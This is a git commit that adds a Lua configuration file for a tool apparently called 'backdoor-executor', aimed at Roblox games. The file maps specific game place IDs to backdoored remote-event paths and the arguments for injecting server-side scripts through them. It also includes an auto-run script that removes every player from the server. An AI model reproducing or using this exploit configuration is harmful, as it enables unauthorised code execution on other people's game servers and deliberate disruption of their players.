b10cf8e8be5f4f9555eb07efda1de3f94498386d
jLn0n <45232009+jLn0n@users.noreply.github.com>
2021-09-30 02:26:27 -0700

    configVer = 2

---
+++ backdoor-executor/bexe-config.lua
@@ -0,0 +1,39 @@
+--[==[
+	cache example:
+	[placeid here (placeid should be only a integer)] = {
+		["Path"] = "remote.path.here", -- don't do remote.path["here"] or the path parser will not work
+		["Args"] = {"arg1here", "source"}, -- source shouldn't be deleted because its a arg for scripts that will be executed
+		["Func"] = function(source) -- only add this when the remote has custom encryption thingy
+			return source
+		end
+	}
+	AutoExec how to use:
+	add a script to it inside the table example:
+	{
+		[[print("im epic")]],
+		[[print("yes")]]
+	}
+	the script on the top will run when backdoor-executor.lua is attached
+	it should be always an array or it will not run
+--]==]
+return {
+	["cachedPlaces"] = {
+		[5033592164] = {
+			["Path"] = game.PlaceId == 5033592164 and game:GetService("ReplicatedStorage"):GetChildren()[1]:GetFullName(),
+			["Args"] = {"1234567890", "source"}
+		},
+		[6879465970] = {
+			["Path"] = "ReplicatedStorage.RemoteEvent",
+			["Args"] = {"source"}
+		},
+	},
+	["autoExec"] = {
+		[[print("backdoor-executor.lua is epic!")]],
+		[[
+			for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+				plr:Destroy()
+			end
+		]]
+	},
+	["configVer"] = 2
+}
